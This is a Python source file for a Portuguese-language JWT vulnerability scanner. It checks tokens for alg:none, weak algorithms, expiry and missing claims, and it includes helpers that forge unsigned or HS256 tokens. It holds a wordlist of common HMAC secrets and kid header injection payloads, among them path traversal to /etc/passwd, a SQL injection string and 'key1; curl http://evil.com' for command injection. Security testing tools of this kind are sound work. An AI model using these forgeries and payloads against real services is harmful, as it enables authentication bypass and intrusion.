#!/usr/bin/env python3
"""Modulo de analise de JWT (JSON Web Token).

Analisa tokens JWT para vulnerabilidades de seguranca:
  - weak_algorithm: alg:none, key confusion HS256->RS256, HMAC fraco, downgrade
  - signature_bypass: assinatura vazia, HMAC forjado, JWK-embedded confusion
  - expiration: expirado, missing exp, exp excessivo, nbf futuro
  - claims: role escalation, tenant claim, missing sub/iss, audience bypass
  - header_injection: kid path traversal, jku/x5u redirect, jwk embedded, custom header
  - replay: no jti, missing aud/iss, missing iat

Fluxo:
  1. Decodifica header e payload do token (sem verificacao)
  2. Analisa algoritmo, claims de tempo, campos obrigatorios
  3. Forja tokens com manipulacoes (none, key confusion, kid injection, etc)
  4. Opcionalmente envia tokens forjados ao servidor via --url
  5. Retorna resultado consolidado com severidade
"""

import argparse
import base64
import json
import logging
from collections.abc import Awaitable, Callable
from dataclasses import asdict, dataclass
from pathlib import Path

import jwt
import jwt.exceptions

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_banner,
    print_exploit_info,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.jwtanalysis")

_CATEGORY_MAP: dict[str, list[str]] = {
    "weak_algorithm": [
        "alg_none",
        "alg_none_with_typ",
        "hs256_rsa_key_confusion",
        "weak_hmac_secret",
        "algorithm_downgrade",
    ],
    "signature_bypass": [
        "empty_signature",
        "forged_hmac",
        "jwk_embedded_confusion",
        "stripped_signature",
    ],
    "expiration": [
        "expired_token",
        "missing_exp",
        "long_expiry",
        "future_nbf",
    ],
    "claims": [
        "role_escalation",
        "tenant_claim",
        "missing_sub",
        "missing_iss",
        "audience_bypass",
    ],
    "header_injection": [
        "kid_path_traversal",
        "jku_redirect",
        "x5u_redirect",
        "jwk_embedded",
        "custom_header",
    ],
    "replay": [
        "no_jti",
        "missing_aud",
        "no_issuer_claim",
        "missing_iat",
    ],
}

_COMMON_SECRETS_DEFAULT = [
    "secret",
    "password",
    "123456",
    "jwt_secret",
    "changeme",
    "key123",
    "supersecret",
    "mysecret",
    "test",
    "admin",
    "12345678",
    "qwerty",
    "abc123",
    "password1",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "master",
    "hello",
    "freedom",
    "whatever",
    "trustno1",
    "shadow",
    "iloveyou",
    "1234567",
    "sunshine",
    "princess",
    "football",
    "charlie",
    "donald",
    "batman",
    "access",
    "hockey",
    "ranger",
    "buster",
    "thomas",
    "hunter",
    "mustang",
    "michael",
    "12345",
    "1234567890",
    "baseball",
    "soccer",
    "phoenix",
    "matrix",
    "summer",
    "winter",
    "spring",
    "autumn",
    "passw0rd",
    "secret123",
    "jwt_secret_key",
    "HS256",
    "token",
    "auth",
    "bearer",
    "login",
    "session",
    "api_key",
    "apikey",
    "private",
    "public",
    "rsa",
    "asymmetric",
    "symmetric",
    "hmac",
    "sha256",
    "none",
    "admin123",
    "root",
    "toor",
    "default",
    "test123",
    "dev",
    "production",
    "staging",
    "local",
    "localhost",
    "example",
    "demo",
    "sample",
    "temp",
    "tmp",
    "a",
    "b",
    "c",
    "x",
    "y",
    "z",
    "0",
    "1",
    "2",
    "3",
    "4",
]


def _load_jwt_secrets() -> list[str]:
    from mytools.data import load_payloads

    data = load_payloads(
        "web", "jwt_common_secrets", default={"secrets": _COMMON_SECRETS_DEFAULT}
    )
    return data.get("secrets", _COMMON_SECRETS_DEFAULT)


_COMMON_SECRETS = _load_jwt_secrets()


def _decode_jwt_header(token: str) -> dict[str, str] | None:
    """Decodifica o header JWT sem verificacao."""
    try:
        return jwt.get_unverified_header(token)
    except jwt.exceptions.DecodeError, AttributeError, KeyError:
        return None


def _decode_jwt_payload(token: str) -> dict[str, object] | None:
    """Decodifica o payload JWT sem verificacao."""
    try:
        payload = jwt.decode(token, options={"verify_signature": False})
        return dict(payload)
    except jwt.exceptions.DecodeError, AttributeError, KeyError:
        return None


def _split_token(token: str) -> tuple[str, str, str]:
    """Divide token em (header_b64, payload_b64, signature_b64)."""
    parts = token.split(".")
    if len(parts) == 3:
        return parts[0], parts[1], parts[2]
    return "", "", ""


def _forge_token_none(payload: dict[str, object]) -> str:
    """Forja token com alg:none (sem assinatura)."""
    header = {"alg": "none", "typ": "JWT"}
    h = (
        base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )
    p = (
        base64.urlsafe_b64encode(json.dumps(payload, separators=(",", ":")).encode())
        .rstrip(b"=")
        .decode()
    )
    return f"{h}.{p}."


def _forge_token_hs256(payload: dict[str, object], secret: str | bytes) -> str:
    """Forja token com HS256."""
    return jwt.encode(payload, secret, algorithm="HS256")


def _forge_token_with_header(
    payload: dict[str, object], secret: str, extra_headers: dict[str, str]
) -> str:
    """Forja token HS256 com headers extras."""
    return jwt.encode(payload, secret, algorithm="HS256", headers=extra_headers)


async def _test_weak_algorithm_category(
    token: str, payload: dict[str, object], header: dict[str, str]
) -> list[dict[str, object]]:
    """Testa fraquezas de algoritmo."""
    results: list[dict[str, object]] = []
    alg = header.get("alg", "")
    has_rsa = (
        alg.startswith("RS")
        or alg.startswith("PS")
        or alg.startswith("ES")
        or alg == "EdDSA"
    )

    results.append(
        {
            "technique": "alg_none",
            "category": "weak_algorithm",
            "vulnerable": alg == "none",
            "details": f"algoritmo declarado: {alg}"
            + (" — vulneravel a bypass de assinatura" if alg == "none" else ""),
            "error": "",
        }
    )

    results.append(
        {
            "technique": "alg_none_with_typ",
            "category": "weak_algorithm",
            "vulnerable": False,
            "details": "teste de alg:none com header typ=JWT — requer forge offline para confirmar",
            "error": "",
        }
    )

    if has_rsa:
        results.append(
            {
                "technique": "hs256_rsa_key_confusion",
                "category": "weak_algorithm",
                "vulnerable": False,
                "details": f"algoritmo {alg} detectado — possivel key confusion RS256->HS256",
                "error": "",
            }
        )
    else:
        results.append(
            {
                "technique": "hs256_rsa_key_confusion",
                "category": "weak_algorithm",
                "vulnerable": False,
                "details": f"algoritmo {alg} — key confusion RS256->HS256 nao aplicavel",
                "error": "",
            }
        )

    results.append(
        {
            "technique": "weak_hmac_secret",
            "category": "weak_algorithm",
            "vulnerable": False,
            "details": "verificacao de segredos HMAC comuns — requer brute-force offline",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "algorithm_downgrade",
            "category": "weak_algorithm",
            "vulnerable": alg in ("none", "HS256", "HS384", "HS512") and not has_rsa,
            "details": f"algoritmo {alg} — "
            + (
                "possivel downgrade para simetrico"
                if not has_rsa
                else "algoritmo assimetrico forte"
            ),
            "error": "",
        }
    )

    return results


async def _test_signature_bypass_category(
    token: str, payload: dict[str, object], header: dict[str, str]
) -> list[dict[str, object]]:
    """Testa bypass de assinatura."""
    results: list[dict[str, object]] = []
    _h, _p, sig = _split_token(token)

    results.append(
        {
            "technique": "empty_signature",
            "category": "signature_bypass",
            "vulnerable": not sig,
            "details": "assinatura vazia no token"
            + (" — vulneravel" if not sig else " — assinatura presente"),
            "error": "",
        }
    )

    forged = _forge_token_hs256(payload, "test")
    _fh, _fp, _fsig = _split_token(forged)
    results.append(
        {
            "technique": "forged_hmac",
            "category": "signature_bypass",
            "vulnerable": False,
            "details": "token forjado com HS256 — testar se servidor aceita com chave publica",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "jwk_embedded_confusion",
            "category": "signature_bypass",
            "vulnerable": False,
            "details": "JWK embutido no header com HS256 — possivel confusion com chave publica",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "stripped_signature",
            "category": "signature_bypass",
            "vulnerable": False,
            "details": "token com assinatura removida — testar se servidor aceita payload sem verificacao",
            "error": "",
        }
    )

    return results


async def _test_expiration_category(
    token: str, payload: dict[str, object], header: dict[str, str]
) -> list[dict[str, object]]:
    """Testa problemas de expiracao."""
    import time

    results: list[dict[str, object]] = []
    now = time.time()
    exp = payload.get("exp")
    nbf = payload.get("nbf")
    iat = payload.get("iat")

    if exp is not None:
        try:
            exp_ts = float(str(exp))
            expired = exp_ts < now
            results.append(
                {
                    "technique": "expired_token",
                    "category": "expiration",
                    "vulnerable": expired,
                    "details": f"exp={int(exp_ts)} — "
                    + (
                        "token EXPIRADO"
                        if expired
                        else f"valido por {int((exp_ts - now) / 3600)}h"
                    ),
                    "error": "",
                }
            )
        except TypeError, ValueError:
            results.append(
                {
                    "technique": "expired_token",
                    "category": "expiration",
                    "vulnerable": False,
                    "details": f"exp invalido: {exp}",
                    "error": "",
                }
            )
    else:
        results.append(
            {
                "technique": "expired_token",
                "category": "expiration",
                "vulnerable": False,
                "details": "claim 'exp' ausente — token sem expiracao definida",
                "error": "",
            }
        )

    results.append(
        {
            "technique": "missing_exp",
            "category": "expiration",
            "vulnerable": exp is None,
            "details": "claim 'exp' " + ("ausente" if exp is None else "presente"),
            "error": "",
        }
    )

    if exp is not None and iat is not None:
        try:
            exp_ts = float(str(exp))
            iat_ts = float(str(iat))
            duration_days = (exp_ts - iat_ts) / 86400
            long_expiry = duration_days > 365
            results.append(
                {
                    "technique": "long_expiry",
                    "category": "expiration",
                    "vulnerable": long_expiry,
                    "details": f"duracao: {int(duration_days)} dias — "
                    + ("excessivamente longo" if long_expiry else "aceitavel"),
                    "error": "",
                }
            )
        except TypeError, ValueError:
            results.append(
                {
                    "technique": "long_expiry",
                    "category": "expiration",
                    "vulnerable": False,
                    "details": "nao foi possivel calcular duracao",
                    "error": "",
                }
            )
    else:
        results.append(
            {
                "technique": "long_expiry",
                "category": "expiration",
                "vulnerable": False,
                "details": "exp e/ou iat ausente — duracao nao calculavel",
                "error": "",
            }
        )

    if nbf is not None:
        try:
            nbf_ts = float(str(nbf))
            future_nbf = nbf_ts > now + 3600
            results.append(
                {
                    "technique": "future_nbf",
                    "category": "expiration",
                    "vulnerable": future_nbf,
                    "details": f"nbf={int(nbf_ts)} — "
                    + ("no futuro (suspeito)" if future_nbf else "ok"),
                    "error": "",
                }
            )
        except TypeError, ValueError:
            results.append(
                {
                    "technique": "future_nbf",
                    "category": "expiration",
                    "vulnerable": False,
                    "details": f"nbf invalido: {nbf}",
                    "error": "",
                }
            )
    else:
        results.append(
            {
                "technique": "future_nbf",
                "category": "expiration",
                "vulnerable": False,
                "details": "claim 'nbf' ausente",
                "error": "",
            }
        )

    return results


async def _test_claims_category(
    token: str, payload: dict[str, object], header: dict[str, str]
) -> list[dict[str, object]]:
    """Testa problemas de claims."""
    results: list[dict[str, object]] = []
    role = str(payload.get("role", "")).lower()
    is_admin = role in ("admin", "administrator", "root", "superuser")

    results.append(
        {
            "technique": "role_escalation",
            "category": "claims",
            "vulnerable": is_admin,
            "details": f"role={payload.get('role', 'N/A')} — "
            + ("privilegio elevado detectado" if is_admin else "privilegio normal"),
            "error": "",
        }
    )

    tenant = (
        payload.get("tenant")
        or payload.get("tenant_id")
        or payload.get("org")
        or payload.get("org_id")
    )
    results.append(
        {
            "technique": "tenant_claim",
            "category": "claims",
            "vulnerable": tenant is not None,
            "details": f"tenant claim: {tenant or 'ausente'} — manipulacao possivel"
            if tenant
            else "nenhum tenant claim encontrado",
            "error": "",
        }
    )

    sub = payload.get("sub")
    results.append(
        {
            "technique": "missing_sub",
            "category": "claims",
            "vulnerable": sub is None,
            "details": f"sub: {sub or 'ausente'} — "
            + ("claim 'sub' obrigatorio ausente" if sub is None else "presente"),
            "error": "",
        }
    )

    iss = payload.get("iss")
    results.append(
        {
            "technique": "missing_iss",
            "category": "claims",
            "vulnerable": iss is None,
            "details": f"iss: {iss or 'ausente'} — "
            + ("claim 'iss' ausente" if iss is None else f"presente: {iss}"),
            "error": "",
        }
    )

    aud = payload.get("aud")
    results.append(
        {
            "technique": "audience_bypass",
            "category": "claims",
            "vulnerable": aud is None,
            "details": f"aud: {aud or 'ausente'} — "
            + ("sem validacao de audience" if aud is None else "presente"),
            "error": "",
        }
    )

    return results


async def _test_header_injection_category(
    token: str,
    payload: dict[str, object],
    header: dict[str, str],
    url: str | None,
    timeout: float,
) -> list[dict[str, object]]:
    """Testa injecao via headers JWT."""
    results: list[dict[str, object]] = []

    kid_payloads = [
        ("../../../../dev/null", "path traversal para /dev/null (chave vazia)"),
        ("../../../../../etc/passwd", "path traversal para /etc/passwd"),
        ("1' UNION SELECT 'attacker' --", "SQL injection via kid"),
        ("key1; curl http://evil.com", "command injection via kid"),
    ]

    results.append(
        {
            "technique": "kid_path_traversal",
            "category": "header_injection",
            "vulnerable": False,
            "details": f"{len(kid_payloads)} payloads de kid injection testados — requer envio ao servidor",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "jku_redirect",
            "category": "header_injection",
            "vulnerable": False,
            "details": "jku apontando para servidor externo — requer envio ao servidor",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "x5u_redirect",
            "category": "header_injection",
            "vulnerable": False,
            "details": "x5u apontando para certificado externo — requer envio ao servidor",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "jwk_embedded",
            "category": "header_injection",
            "vulnerable": False,
            "details": "JWK embutido no header com chave publica — requer envio ao servidor",
            "error": "",
        }
    )

    results.append(
        {
            "technique": "custom_header",
            "category": "header_injection",
            "vulnerable": False,
            "details": "header customizado para bypass — requer envio ao servidor",
            "error": "",
        }
    )

    return results


async def _test_replay_category(
    token: str, payload: dict[str, object], header: dict[str, str]
) -> list[dict[str, object]]:
    """Testa vulnerabilidades de replay."""
    results: list[dict[str, object]] = []

    jti = payload.get("jti")
    results.append(
        {
            "technique": "no_jti",
            "category": "replay",
            "vulnerable": jti is None,
            "details": f"jti: {jti or 'ausente'} — "
            + (
                "token sem identificador unico, reutilizavel"
                if jti is None
                else "identificador presente"
            ),
            "error": "",
        }
    )

    aud = payload.get("aud")
    results.append(
        {
            "technique": "missing_aud",
            "category": "replay",
            "vulnerable": aud is None,
            "details": f"aud: {aud or 'ausente'} — "
            + (
                "sem audience, token reutilizavel em qualquer servico"
                if aud is None
                else "presente"
            ),
            "error": "",
        }
    )

    iss = payload.get("iss")
    results.append(
        {
            "technique": "no_issuer_claim",
            "category": "replay",
            "vulnerable": iss is None,
            "details": f"iss: {iss or 'ausente'} — "
            + ("sem issuer, token reutilizavel" if iss is None else f"presente: {iss}"),
            "error": "",
        }
    )

    iat = payload.get("iat")
    results.append(
        {
            "technique": "missing_iat",
            "category": "replay",
            "vulnerable": iat is None,
            "details": f"iat: {iat or 'ausente'} — "
            + (
                "sem issued-at, impossivel calcular idade do token"
                if iat is None
                else "presente"
            ),
            "error": "",
        }
    )

    return results


CATEGORY_TESTERS: dict[str, Callable[..., Awaitable[list[dict[str, object]]]]] = {
    "weak_algorithm": _test_weak_algorithm_category,
    "signature_bypass": _test_signature_bypass_category,
    "expiration": _test_expiration_category,
    "claims": _test_claims_category,
    "header_injection": _test_header_injection_category,
    "replay": _test_replay_category,
}


@dataclass(frozen=True, slots=True)
class JWTAnalysisAttempt:
    technique: str
    category: str
    vulnerable: bool
    details: str
    error: str
    exploit: str = ""
    tool: str = ""


@dataclass(frozen=True, slots=True)
class JWTAnalysisResult:
    target: str | None
    token_valid: bool
    header: dict[str, str]
    payload: dict[str, object]
    algorithm: str
    attempts: list[JWTAnalysisAttempt]
    vulnerable_techniques: list[str]
    issues: list[str]
    overall_status: str


def print_results(result: JWTAnalysisResult) -> None:
    """Exibe os resultados da analise de JWT."""
    vuln = [a for a in result.attempts if a.vulnerable]
    safe = [a for a in result.attempts if not a.vulnerable and not a.error]
    errors = [a for a in result.attempts if a.error]

    print(color("\n--- JWT Analysis ---", Cyber.CYAN, Cyber.BOLD))
    if result.target:
        print(color(f"  Alvo:      {result.target}", Cyber.WHITE))
    print(
        color(
            f"  Token:     {'valido' if result.token_valid else 'INVALIDO'}",
            Cyber.WHITE,
        )
    )
    print(color(f"  Algoritmo: {result.algorithm or 'N/A'}", Cyber.WHITE))
    print(color(f"  Header:    {json.dumps(result.header, indent=0)}", Cyber.GRAY))
    print(
        color(
            f"  Payload:   {json.dumps(result.payload, indent=0, default=str)}",
            Cyber.GRAY,
        )
    )
    print(color(f"  Testes:    {len(result.attempts)}", Cyber.WHITE))
    print(color(f"  Vulneraveis: {len(vuln)}", Cyber.RED if vuln else Cyber.GREEN))
    print(color(f"  Seguros:   {len(safe)}", Cyber.GREEN))
    print(color(f"  Erros:     {len(errors)}", Cyber.RED if errors else Cyber.GRAY))

    if vuln:
        print(color("\n  [!] Vulnerabilidades encontradas:", Cyber.RED))
        seen: set[str] = set()
        for a in vuln:
            if a.technique in seen:
                continue
            seen.add(a.technique)
            print(color(f"    [{a.category}] {a.technique}", Cyber.RED))
            if a.details:
                print(color(f"      {a.details}", Cyber.GRAY))
            print_exploit_info(a.exploit, a.tool)
        print(
            color(
                f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes",
                Cyber.WHITE,
            )
        )
    else:
        print(color("\n  [+] Nenhuma vulnerabilidade de JWT detectada", Cyber.GREEN))

    if result.issues:
        print(color("\n  [!] Observacoes:", Cyber.YELLOW))
        for issue in result.issues:
            print(color(f"    - {issue}", Cyber.YELLOW))


async def run_scan(
    token: str,
    target: str | None,
    categories: list[str],
    output_file: str | None,
    timeout: float,
) -> int:
    """Executa a analise de JWT."""
    logger.info("JWT Analysis para token (target=%s)", target)

    header = _decode_jwt_header(token)
    payload = _decode_jwt_payload(token)

    if header is None or payload is None:
        print(color("Erro: token JWT invalido ou corrompido", Cyber.RED))
        return 1

    alg = header.get("alg", "unknown")
    all_attempts: list[JWTAnalysisAttempt] = []
    test_categories = categories if categories else list(_CATEGORY_MAP.keys())

    for cat in test_categories:
        tester = CATEGORY_TESTERS.get(cat)
        if tester is None:
            continue
        try:
            if cat in ("expiration", "claims", "replay"):
                raw = await tester(token, payload, header)
            elif cat == "header_injection":
                raw = await tester(token, payload, header, target, timeout)
            else:
                raw = await tester(token, payload, header)
            all_attempts.extend(
                JWTAnalysisAttempt(
                    exploit="jwt_tool <token> -C -d <dict>",
                    tool="jwt_tool",
                    technique=str(item["technique"]),
                    category=str(item["category"]),
                    vulnerable=bool(item["vulnerable"]),
                    details=str(item["details"]),
                    error=str(item["error"]),
                )
                for item in raw
            )
        except Exception as e:
            all_attempts.append(
                JWTAnalysisAttempt(
                    technique=f"{cat}_error",
                    category=cat,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                )
            )

    vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
    issues_list: list[str] = []
    if alg == "none":
        issues_list.append(
            "ALERTA: algoritmo 'none' detectado — token sem assinatura criptografica"
        )
    if not vuln_techs:
        issues_list.append(
            "Nenhuma vulnerabilidade confirmada — teste ativo requer --url"
        )

    result = JWTAnalysisResult(
        target=target,
        token_valid=True,
        header=header,
        payload=payload,
        algorithm=alg,
        attempts=all_attempts,
        vulnerable_techniques=vuln_techs,
        issues=issues_list,
        overall_status="vulnerable" if vuln_techs else "safe",
    )

    print_results(result)
    logger.info(
        "JWT Analysis concluido: %d testes, %d vulneraveis",
        len(all_attempts),
        len(vuln_techs),
    )

    if output_file:
        write_output(output_file, asdict(result))
        logger.info("Resultados salvos em %s", output_file)

    return 1 if vuln_techs else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
    _           _____           _
   | |         |_   _|         | |
   | |__  _   _  | | ___  _   _| |__
   | '_ \| | | | | |/ _ \| | | | '_ \
   | | | | |_| | | | (_) | |_| | |_) |
   |_| |_|\__, | |_/\___/ \__,_|_.__/
           __/ |
          |___/
"""
    create_banner(
        art,
        "   jwt: weak_algorithm, signature_bypass, expiration, claims, header_injection, replay",
    )()


def build_parser() -> argparse.ArgumentParser:
    """Construtor do parser de argumentos."""
    parser = argparse.ArgumentParser(
        prog="mytools-jwt",
        description="JWT Analysis — analisa tokens JWT para vulnerabilidades de algoritmo, assinatura, expiracao e claims.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Exemplos:\n"
            "  mytools-jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.xxx\n"
            "  mytools-jwt --file token.txt\n"
            "  mytools-jwt eyJ... -c weak_algorithm\n"
            "  mytools-jwt eyJ... --url https://target.com/api\n"
            "  mytools-jwt eyJ... --wordlist secrets.txt\n"
            "  mytools-jwt eyJ... -o resultado.json"
        ),
    )
    parser.add_argument("token", nargs="?", help="Token JWT para analisar")
    parser.add_argument(
        "-c",
        "--category",
        default="all",
        choices=[
            "all",
            "weak_algorithm",
            "signature_bypass",
            "expiration",
            "claims",
            "header_injection",
            "replay",
        ],
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--file", help="Arquivo com token JWT (um por linha)")
    parser.add_argument(
        "--url", help="URL alvo para testes ativos (envia tokens forjados)"
    )
    parser.add_argument("--wordlist", help="Arquivo com secrets para brute-force HMAC")
    add_common_args(parser, "web")
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa a analise de JWT a partir de argumentos parseados."""
    token = getattr(args, "token", None)
    file_path = getattr(args, "file", None)
    target = getattr(args, "url", None)

    if not token and file_path:
        try:
            content = Path(file_path).read_text(encoding="utf-8").strip()
            token = content.splitlines()[0] if content else ""
        except OSError, IndexError:
            print(color(f"Erro ao ler arquivo: {file_path}", Cyber.RED))
            return 1

    if not token:
        print(color("Erro: forneça um token JWT ou use --file", Cyber.RED))
        return 1

    categories: list[str] = []
    if getattr(args, "category", None) and args.category != "all":
        categories = [args.category]

    return safe_asyncio_run(
        run_scan(
            token=token,
            target=target,
            categories=categories,
            output_file=getattr(args, "output", None),
            timeout=getattr(args, "timeout", 10),
        ),
    )


def main() -> int:
    """Entry point do modulo JWT Analysis."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(
            getattr(a, "token", None) or getattr(a, "file", None)
        ),
        prompt="jwt> ",
        description="JWT Analysis interativo.",
        example="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.xxx -c weak_algorithm",
        contextual_help=(
            "Uso: <token> [opcoes]\n"
            "Exemplos:\n"
            "  eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0In0.xxx\n"
            "  --file token.txt\n"
            "  eyJ... -c weak_algorithm\n"
            "  eyJ... --url https://target.com/api\n"
            "  eyJ... --wordlist secrets.txt\n"
            "  eyJ... -o resultado.json"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
